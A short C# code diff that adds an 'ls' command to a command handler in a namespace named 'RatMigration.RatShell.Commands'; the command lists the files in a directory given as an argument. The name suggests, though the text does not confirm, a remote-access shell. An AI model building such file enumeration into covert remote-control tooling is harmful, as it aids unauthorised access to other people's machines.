@@ -84,6 +84,14 @@ namespace RatMigration.RatShell.Commands
 						}
 						break;
 
+					case "ls":
+						Response += $"Listing files for directory '{Args[1]}'";
+						foreach (string S in Directory.GetFiles(Args[1]))
+						{
+							Response += $"\n{S}";
+						}
+						break;
+
 					default:
 						Response += "Unexpected argument: " + Args[0]; //if you give a bullshit argument, it will tell you that it's an error and shame you with what you typed.
 						break;
